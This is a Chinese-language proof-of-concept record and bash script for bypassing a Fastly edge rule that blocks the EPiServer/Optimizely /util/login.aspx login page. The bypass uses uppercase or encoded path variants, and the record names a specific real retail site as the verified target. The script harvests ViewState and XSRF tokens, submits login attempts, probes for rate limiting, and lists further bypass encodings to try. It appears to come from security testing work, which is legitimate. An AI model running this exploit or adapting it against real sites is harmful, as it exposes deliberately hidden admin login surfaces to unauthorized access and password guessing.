# EPiServer CMS /util/login.aspx 被 Fastly 边缘规则按小写字面 406 封堵，改大写路径即绕过并匿名暴露完整登录 WebForms 面

- **code**: episerver-util-login-fastly-lowercase-case-bypass
- **kind**: poc
- **category**: unauthorized
- **component**: EPiServer CMS（Util handler /util/login.aspx）+ Fastly 边缘 VCL
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: finding_id=150（task#6，finding_checks.verdict=verified，findings.status=confirmed）。2026-11-11 于 ARTEX 执行机（Linux，curl 8.x + Python3 urllib，经平台记录代理）对 www.greenmangaming.com 实测并两轮复测一致：① 基线 GET /util/login.aspx → HTTP/2 406、content-length: 0，响应头 x-served-by: cache-iad-kcgs7200023-IAD 等（Fastly 生成，非应用），证明是边缘规则而非源站路由；② GET /UTIL/LOGIN.ASPX → HTTP/2 200、content-length: 8025、server: nginx，正文含 __VIEWSTATE、__VIEWSTATEGENERATOR=83631FEE、__EVENTVALIDATION、__epiXSRF、<form method="post" action="./LOGIN.ASPX" id="aspnetForm">；③ 变体矩阵：/UTIL%2fLOGIN.ASPX、/UTIL/./LOGIN.ASPX、/UTIL/LOGIN.ASPX/ 均 200/8025，而 /util/login.aspx、//util/login.aspx、/./util/login.aspx、/util%2flogin.aspx、/%75til/login.aspx 均 406 —— 规则按解码后小写字面匹配且大小写敏感；④ POST /UTIL/LOGIN.ASPX（隐藏域同值 __epiXSRF 同时放 Cookie 与表单、合法 ViewState、错口令）→ HTTP/2 200、8211B，页面回显 "Login failed"；同一会话对不存在用户连续 8 次错口令均 200/8214B，无 429/锁定/验证码；⑤ 阴性对照：篡改 ViewState 任一字节或置空 → HTTP 500，说明 ViewState 加密+MAC 生效（84B 全随机密文），无 machineKey 不可伪造。据此判定「匿名取得被刻意屏蔽的 CMS 认证面」成立；未取得有效凭据，故未升级为账号接管。
- **path**: pocs/episerver-util-login-fastly-lowercase-case-bypass/episerver_util_case_bypass.sh
- **tags**: episerver,optimizely,util,login.aspx,fastly,edge-rule,case-sensitivity,path-normalization,waf-bypass,viewstate,eventvalidation,epixsrf,unauth,login-oracle
- **created_at**: 2026-11-11T18:42:14.448Z
- **engine**: https://www.greenmangaming.com/UTIL/LOGIN.ASPX

## 描述

EPiServer/Optimizely CMS 的内置 Util 登录处理器 /util/login.aspx 常被运营方用 CDN 边缘规则（本例 Fastly VCL）整段封掉（406 + 0 字节）。若该规则按小写字面匹配且不做路径归一化，则改成大写/混合大小写（/UTIL/LOGIN.ASPX）或插入 %2f、/.、尾斜杠即被回源，匿名拿到完整的 ASP.NET WebForms 登录页（__VIEWSTATE/__EVENTVALIDATION/__epiXSRF），且 POST 会真实进入 EPiServer 认证流程。前提：目标为 EPiServer/Optimizely，边缘规则大小写敏感，源站未额外限制该 handler。价值：受 WAF 隐蔽的 CMS 认证面对匿名可达，可用于不触发边缘规则的版本/结构侦察与（授权范围内）低频口令验证；ViewState 有加密+MAC，无 machineKey 不能伪造。与 #566（cache.* → internal-prod-heimdall-episerver-cache.* 内网 ELB 泄露，纯 DNS 情报）不同：本条是可复现的路径绕过。

## 用法

```
T=https://host bash episerver_util_case_bypass.sh            # 默认只用 /UTIL/LOGIN.ASPX
T=https://host bash episerver_util_case_bypass.sh /UTIL%2fLOGIN.ASPX   # 指定变体

三段判据（缺一不算命中）：
1) GET /util/login.aspx → 406 | 0B，且响应头带 CDN 特征（Fastly: x-served-by/x-cache；Cloudflare: cf-ray）→ 确认是边缘规则，不是 404 路由不存在。
2) GET /UTIL/LOGIN.ASPX → 200 | ~8KB | text/html，正文 grep 到 __VIEWSTATE + __VIEWSTATEGENERATOR + __EVENTVALIDATION + __epiXSRF。
   /UTIL%2fLOGIN.ASPX、/UTIL/./LOGIN.ASPX、/UTIL/LOGIN.ASPX/ 同样应 200；/%75til/login.aspx（编码成小写 u）仍应 406 —— 这才是“规则按小写字面匹配”的证明，而不是“随便什么路径都 200”。
3) POST /UTIL/LOGIN.ASPX：Cookie: __epiXSRF=<隐藏域同值> + 表单 __epiXSRF/__VIEWSTATE/__VIEWSTATEGENERATOR/__EVENTVALIDATION 原值 + LoginControl$UserName/$Password/$Button1 → 200 且回显 Login failed（= 应用真的执行了认证逻辑，不是静态壳）。
负面/边界：
- ViewState 改一个字节或置空 → 500：加密+MAC 生效，别指望 ViewState 伪造或反序列化。
- 用 curl 时务必 --path-as-is，否则 /. 与 // 会被客户端归一化，得到假 200。
- 只改大小写无效的目标（返回同 406/404）说明规则做了 tolower 或路径归一化，此时转试 %2f、尾斜杠、;path、双写等；全部同码即该防护未留缺口。
- 后续口令验证保持低频（来源目标 8 次连续失败仍无限速，但不要据此认定可无限爆破）。
```

## 正文

```
#!/usr/bin/env bash
# =============================================================================
# EPiServer CMS /util/login.aspx：CDN 边缘规则（本例 Fastly VCL）按【小写字面】匹配 406，
# 改为大写/混合大小写路径即绕过 → 匿名取得完整 EPiServer 登录 WebForms 页
# （ViewState / EventValidation / __epiXSRF），且该页真实执行认证逻辑（错口令回 Login failed）。
#
# 适用面：EPiServer/Optimizely CMS 站点，运维方用边缘规则硬封 /util/ 前缀
#         （Util handler 是 EPiServer 内置登录/管理入口），但规则实现是大小写敏感字面匹配。
# 前置：无需任何账号/Cookie；目标 443 对公网开放，CDN 前置。
#
# 用法：
#   T=https://host bash episerver_util_case_bypass.sh
#   T=https://host bash episerver_util_case_bypass.sh /UTIL%2fLOGIN.ASPX   # 指定变体
# 落盘：当前工作目录 page.html / post.html
# =============================================================================
set -u

T="${1:-https://TARGET}"; T="${T%/}"
VAR="${2:-/UTIL/LOGIN.ASPX}"
UA="${ARTEX_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36}"

req(){ curl -sk --path-as-is --max-time 25 -A "$UA" "$@"; }

echo "== [0] 基线：小写字面应被边缘规则拦成 406/0B（若是 404，说明是路由不存在，另一码事）"
req -o /dev/null -w '  GET /util/login.aspx -> %{http_code} | %{size_download}B | %{content_type}\n' "$T/util/login.aspx"

echo "== [1] 变体矩阵：判据 = 同一资源在不同大小写/分隔符下响应不同"
for p in /UTIL/LOGIN.ASPX /Util/Login.aspx /UTIL%2fLOGIN.ASPX /UTIL/./LOGIN.ASPX /UTIL/LOGIN.ASPX/ \
         /util/login.aspx /%75til/login.aspx /util%2flogin.aspx; do
  req -o /dev/null -w "  %-24s -> %{http_code} | %{size_download}B\n" "$T$p"
done
# 实测口径（来源目标）：
#   大写族 200 / ~8025B ；小写族 406 / 0B
#   /%75til/login.aspx（把 u 百分号编码成小写）仍 406 → 规则匹配解码后的字面值且区分大小写
#   /UTIL/./LOGIN.ASPX 与 /UTIL/LOGIN.ASPX/ 也 200 → 边缘未做路径归一化，回源后由 EPiServer 路由吃掉

echo "== [2] 取页面并确认真是 EPiServer 登录 WebForms"
req "$T$VAR" -o page.html -w '  GET page -> %{http_code} | %{size_download}B | %{content_type}\n'
for k in '__VIEWSTATE' '__VIEWSTATEGENERATOR' '__EVENTVALIDATION' '__epiXSRF' 'aspnetForm'; do
  printf '  %-24s hits=' "$k"; grep -c -- "$k" page.html
done
grep -oiE 'name="__VIEWSTATEGENERATOR"[^>]*value="[^"]*"' page.html | head -1

field(){ python3 - "$1" <<'PY'
import re, sys
html = open('page.html', encoding='utf-8', errors='ignore').read()
m = re.search(r'name="%s"[^>]*value="([^"]*)"' % re.escape(sys.argv[1]), html)
print(m.group(1) if m else '')
PY
}

VS="$(field __VIEWSTATE)"; GEN="$(field __VIEWSTATEGENERATOR)"
EV="$(field __EVENTVALIDATION)"; XSRF="$(field __epiXSRF)"
echo "  token lens: VIEWSTATE=${#VS} GEN=$GEN EVENTVALIDATION=${#EV} epiXSRF=${#XSRF}"
[ -n "$VS" ] && [ -n "$XSRF" ] || { echo "  [STOP] 缺 ViewState/XSRF，页面不是登录表单（可能被缓存页/WAF 挑战页替换）"; exit 1; }

echo "== [3] POST 错口令：__epiXSRF 双提交（Cookie + 表单同值）+ 合法 ViewState → 应进业务层"
req -o post.html -w '  POST login -> %{http_code} | %{size_download}B\n' \
  -H "Cookie: __epiXSRF=$XSRF" \
  --data-urlencode "__LASTFOCUS=" \
  --data-urlencode "__epiXSRF=$XSRF" \
  --data-urlencode "__EVENTTARGET=" \
  --data-urlencode "__EVENTARGUMENT=" \
  --data-urlencode "__VIEWSTATE=$VS" \
  --data-urlencode "__VIEWSTATEGENERATOR=$GEN" \
  --data-urlencode "__EVENTVALIDATION=$EV" \
  --data-urlencode 'LoginControl$UserName=zzqnotexist_991' \
  --data-urlencode 'LoginControl$Password=ZzqWrong!42' \
  --data-urlencode 'LoginControl$Button1=Log in' \
  "$T$VAR"
grep -oiE 'login failed|invalid login|incorrect|error[^<]{0,80}' post.html | head -5
echo "  判据：200 + Login failed = 认证逻辑真实执行；若回 500/跳转，多为 XSRF 未对齐或 ViewState 已过期（重新 GET 取新 token）"

echo "== [4] 阴性对照：篡改 ViewState 一个字符 → 期望 500（加密+MAC 生效，无 machineKey 不可伪造）"
BAD="$(python3 - "$VS" <<'PY'
import sys
s = sys.argv[1]; i = len(s)//2
print(s[:i] + ('A' if s[i] != 'A' else 'B') + s[i+1:])
PY
)"
req -o /dev/null -w '  tampered VIEWSTATE -> %{http_code} | %{size_download}B\n' \
  -H "Cookie: __epiXSRF=$XSRF" \
  --data-urlencode "__epiXSRF=$XSRF" \
  --data-urlencode "__VIEWSTATE=$BAD" \
  --data-urlencode "__VIEWSTATEGENERATOR=$GEN" \
  --data-urlencode "__EVENTVALIDATION=$EV" \
  --data-urlencode 'LoginControl$UserName=zzqnotexist_991' \
  --data-urlencode 'LoginControl$Password=ZzqWrong!42' \
  --data-urlencode 'LoginControl$Button1=Log in' \
  "$T$VAR"

echo "== [5] 限速/锁定探测（低频，5 次；仅为判定有无 429/验证码，勿据此判定可无限爆破）"
i=0; hit=0
while [ $i -lt 5 ]; do
  i=$((i+1))
  out="$(req -o /dev/null -w '%{http_code}|%{size_download}' -H "Cookie: __epiXSRF=$XSRF" \
      --data-urlencode "__epiXSRF=$XSRF" --data-urlencode "__VIEWSTATE=$VS" \
      --data-urlencode "__VIEWSTATEGENERATOR=$GEN" --data-urlencode "__EVENTVALIDATION=$EV" \
      --data-urlencode 'LoginControl$UserName=zzq_ratelimit_probe' \
      --data-urlencode "LoginControl\$Password=ZzqWrong$i!" \
      --data-urlencode 'LoginControl$Button1=Log in' "$T$VAR")"
  echo "  #$i -> $out"
  case "$out" in 429*|403*) echo "  [STOP] 出现限速/拦截特征"; hit=1; break;; esac
  sleep 1
done
[ $hit -eq 0 ] && echo "  [-] 5 次未触发限速（来源目标 8 次连续失败均 200/8214B，无 429/锁定/验证码）"

cat <<'TIPS'

=== 失败时的常见原因 ===
1) /UTIL/LOGIN.ASPX 也 406 → 规则做了 tolower / 正则 (?i) / 路径归一化；改试 %2f、尾斜杠、;path、双写 %2555，
   全部同码即该防护无缺口，收工。
2) 200 但正文 0 字节或非登录页 → 边缘返回缓存/挑战页；换浏览器 UA、加 Accept: text/html，禁用缓存（-H 'Cache-Control: no-cache'）。
3) POST 回 500 且页面提示 XSRF → __epiXSRF Cookie 与表单值不一致，或 ViewState 已过期；重新 GET 同一变体路径取新 token。
4) POST 回 302 到 /util/login.aspx?ReturnUrl=... → 该路径被应用层加了额外跳转；
   检查是否必须带 __LASTFOCUS/__EVENTTARGET 原值（有些 EPiServer 版本校验 form field 集合）。
5) 只改大小写返回 200 但 content-length 与基线一致为 0 → CDN 的 200 是假成功（body 被清空），必须 grep 到 __VIEWSTATE 才算命中。
6) 目标不是 EPiServer → 该页面不会有 __VIEWSTATEGENERATOR/__epiXSRF；改按框架指纹重新定性，不要硬套。
TIPS
```
